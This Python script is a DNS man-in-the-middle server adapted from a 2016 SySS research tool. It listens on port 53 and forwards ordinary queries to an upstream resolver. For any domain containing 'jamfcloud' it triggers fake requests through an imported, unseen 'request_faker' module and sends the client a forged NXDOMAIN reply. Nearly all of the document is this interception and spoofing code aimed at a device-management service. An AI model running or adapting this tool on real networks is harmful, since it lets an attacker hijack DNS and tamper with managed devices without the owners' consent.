# Credit to: Adrian Vollmer, SySS GmbH 2016
# https://github.com/SySS-Research/dns-mitm/blob/master/dns-mitm.py

import socket
import dnslib

from request_faker import handle_response, send_initial_request

def perform_fake_interaction():
    response = send_initial_request()
    response = handle_response(response)
    while response is not None:
        response = handle_response(response)

PORT = 53

def receiveData(udps):
    types = {1: "A", 2: "NS", 15: "MX", 16: "TXT", 28: "AAAA"}

    data, addr = udps.recvfrom(1024)

    dnsD = dnslib.DNSRecord.parse(data)

    try:
        type = types[dnsD.questions[0].qtype]
    except KeyError:
        type = "OTHER"

    labels = dnsD.questions[0].qname.label
    header_id = dnsD.header.id
    request_q = dnsD.q
    domain = b'.'.join(labels)
    domain = domain.decode()

    print("Being requested %s %s" %
        (type, domain))
    return data, header_id, request_q, addr, domain


def forwarded_dns_request(data):
    print("forwarding...")
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.sendto(data, ("1.1.1.1", 53))
    data, _ = udps.recvfrom(1024)

    return data


def main_loop(udps):
    while True:
        data, header_id, request_q, addr, domain = receiveData(udps)

        if "jamfcloud" in domain:
            perform_fake_interaction()

            # Not found response
            response = dnslib.DNSRecord(dnslib.DNSHeader(id=header_id, qr=1, aa=1, ra=1), q=request_q)
            response.header.rcode = dnslib.RCODE.NXDOMAIN

            udps.sendto(response.pack(), addr)
        else:
            answer = forwarded_dns_request(data)
            udps.sendto(answer, addr)

def init_listener():
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('', PORT))

    return udps

def main():
    udps = init_listener()
    main_loop(udps)


if __name__ == '__main__':
    main()